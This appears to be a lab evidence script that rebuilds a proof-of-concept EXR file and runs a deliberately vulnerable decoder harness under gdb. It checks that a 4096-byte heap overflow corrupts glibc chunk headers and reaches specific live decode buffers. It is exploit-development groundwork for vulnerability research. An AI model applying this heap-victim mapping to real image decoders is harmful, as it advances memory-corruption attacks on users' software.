#!/bin/sh
# W171: map the real 4096-byte sink onto live glibc heap chunks.
# Needs bin-vuln-plain/flat_harness (see BUILDLOG.md) and gdb.
# Writes the normalized observation to evidence/heap-victims.out. The gdb
# script pins inferior ASLR off, so the whole file is byte-stable in this lab.
set -eu
cd "$(dirname "$0")/.."

python3 cases/make_poc.py cases/baseline.exr cases/poc.exr >/dev/null
test "$(sha256sum cases/poc.exr | cut -d' ' -f1)" = \
    283cec0e18532c500495e71496145832d36dbfc502e44f490e09114661ab37ce

gdb -q -batch -x harness/heap-victims.cmd --args ./bin-vuln-plain/flat_harness \
    2>&1 | grep -v '^sort2_4ByteChannels_tiled (' > evidence/heap-victims.out

grep -Fqx 'SINK n=4096 src_minus_dst=304' evidence/heap-victims.out
grep -Fqx 'CHUNK-COUNT total=20 first_off=64' evidence/heap-victims.out
grep -Fqx 'LIVE-PTR-COUNT scanned=11 inside=3' evidence/heap-victims.out
grep -Fqx 'LIVE-PTR-INSIDE decode.unpacked_buffer off=+0' evidence/heap-victims.out
grep -Fqx 'LIVE-PTR-INSIDE decode.scratch_buffer_2 off=+272' evidence/heap-victims.out
grep -Fqx 'LIVE-PTR-INSIDE decode.scratch_buffer_1 off=+304' evidence/heap-victims.out
grep -Fqx 'HDR-CORRUPTED 19/20' evidence/heap-victims.out
grep -Fqx 'FIRST-HDR off=+64 before=0x31 after-changed=yes' evidence/heap-victims.out
echo 'RESULT PASS'
